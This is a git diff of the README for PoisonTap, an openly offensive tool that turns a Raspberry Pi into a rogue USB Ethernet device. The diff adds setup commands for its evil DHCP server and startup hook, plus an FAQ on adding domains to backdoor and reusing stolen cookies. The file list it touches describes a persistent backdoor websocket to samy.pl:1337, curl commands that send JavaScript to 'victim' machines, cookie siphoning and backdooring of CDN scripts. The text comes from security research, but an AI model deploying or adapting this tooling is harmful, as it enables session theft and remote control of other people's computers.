@@ -34,7 +34,7 @@ When **[PoisonTap](https://samy.pl/poisontap)** (<a href="http://amzn.to/2eMr2WY
 
 # Demo
 
-PoisonTap is built for the $5 <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> without any additional components other than a <a href="https://amzn.to/2fUMdah" target="_blank">micro-USB cable</a> & <a href="https://amzn.to/2fWgKsd" target="_blank">microSD card</a>, but can work on other devices that can emulate USB gadgets such as <a href="https://inversepath.com/usbarmory" target="_blank">USB Armory</a> and <a href="https://lanturtle.com/" target=_blank>LAN Turtle</a>.
+PoisonTap is built for the $5 <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> without any additional components other than a <a href="https://amzn.to/2fUMdah" target="_blank">micro-USB cable</a> & <a href="https://amzn.to/2fWgKsd" target="_blank">microSD card</a>, or can work on any Raspberry Pi (1/2/3) with an Ethernet-to-USB/Thunderbolt dongle, or can work on other devices that can emulate USB gadgets such as <a href="https://inversepath.com/usbarmory" target="_blank">USB Armory</a> and <a href="https://lanturtle.com/" target=_blank>LAN Turtle</a>.
 
 **Live demonstration** and more details available in the video:
 <a href="https://www.youtube.com/watch?v=Aatp5gCskvk" target="_blank"><img src= "https://samy.pl/poisontap/ptap-thumbnail-small.png" alt="MagSpoof" border="1" /></a>
@@ -159,11 +159,34 @@ If you are running a web server, securing against PoisonTap is simple:
 
 -----
 
-# File Breakdown
+# Installation / File Breakdown
+
+Note: If you find the device is NOT acting as an Ethernet controller automatically (older versions of Windows, for example), you can [change the VID and PID in pi_startup.sh](https://github.com/samyk/poisontap/issues/8#issuecomment-265818957)
+
+```bash
+# Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41
+sudo bash
+
+# If Raspbian BEFORE 2016-05-10, then run next line:
+BRANCH=next rpi-update
+
+echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
+echo "dtoverlay=dwc2" >> /boot/config.txt
+echo -e "dwc2\ng_ether" >> /etc/modules
+sudo sed --in-place "/exit 0/d" /etc/rc.local
+echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local
+mkdir /home/pi/poisontap
+chown -R pi /home/pi/poisontap
+apt-get update && apt-get upgrade
+apt-get -y install isc-dhcp-server dsniff screen nodejs
+```
+
+Place dhcpd.conf in /etc/dhcp/dhcpd.conf and the rest of the files in /home/pi/poisontap, then reboot to ensure everything is working.
+
 There are a number of <a href="https://github.com/samyk/poisontap" target=_blank>files in the repo</a>, which are used on different sides. The list:
 
 * **backdoor.html** - Whenever a http://hostname/PoisonTap URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound websocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/PoisonTap, this is the content that gets populated (even after PoisonTap is removed from the machine).
-* **backend_server.js** - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to to send commands to your PoisonTapped minion machines, eg
+* **backend_server.js** - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to send commands to your PoisonTapped minion machines, eg
 
 ```bash
 # pop alert to victim
@@ -176,8 +199,17 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 * **pi_poisontap.js** - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by PoisonTap, storing siphoned cookies, and injecting the cached backdoors.
 * **pi_startup.sh** - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_poisontap.js above. 
 * **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
-* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
+* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara oen CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
 * **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.
+
+-----
+
+# Frequently Asked Questions
+
+* **Q:** How do you add additional domains to be backdoored?
+* **A:** The list of domains to be backdoored is set in `target_injected_xhtmljs.html` by the `getDoms()` function. This itself is populated by the `alexa1m.sh` script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in `getDoms()`.
+* **Q:** How do you use the captured cookies?
+* **A:** You can use the [Document.cookie API](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) directly from the JavaScript console in your browser to set cookies. [This StackOverflow post](https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome) also has a few Chrome-specific suggestions, for example the [Cookie Inspector](https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn) Chrome extension.
 
 -----
 
